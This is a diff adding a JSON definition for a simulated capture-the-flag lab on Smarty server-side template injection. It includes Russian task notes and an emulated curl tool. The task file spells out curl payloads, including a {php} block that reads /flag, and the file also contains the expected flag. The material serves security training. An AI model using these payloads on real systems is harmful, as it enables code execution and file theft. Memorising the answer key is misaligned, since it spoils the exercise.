@@ -1,0 +1,41 @@
+{
+  "id": "web-smarty",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{sm4rty_st4t1c_c4ll_rce}"
+  },
+  "fs": [
+    {
+      "path": "/home/student/task",
+      "type": "dir"
+    },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: Smarty SSTI\n\nЭндпоинт /greet подставляет name в Smarty-шаблон.\nДойди до исполнения PHP и прочитай флаг.\n\n1. Подтверди движок:\n   curl -s 'https://app.target/greet?name=%7B7*7%7D'\n2. Проверь статический вызов / {php}:\n   curl -s 'https://app.target/greet?name=%7Bphp%7Decho%20file_get_contents(%27/flag%27);%7B/php%7D'\n3. Запиши вывод с флагом в found.txt и набери check.\n"
+    },
+    {
+      "path": "/home/student/task/notes.txt",
+      "text": "Smarty 3.1.28 (legacy, {php} включён).\nСинтаксис выражений: {7*7}, {$var}, {$x|modifier}\nСтатические вызовы: {Class::method()}\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция app.target/greet)",
+      "cases": [
+        {
+          "match": "%7B7\\*7%7D|\\{7\\*7\\}",
+          "example": "-s '.../greet?name={7*7}'",
+          "output": "Hello 49\n"
+        },
+        {
+          "match": "php|file_get_contents|system|exec|flag",
+          "example": "-s '.../greet?name={php}echo file_get_contents('/flag');{/php}'",
+          "output": "Hello nto{sm4rty_st4t1c_c4ll_rce}\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируется только /greet на app.target.\n"
+    }
+  }
+}
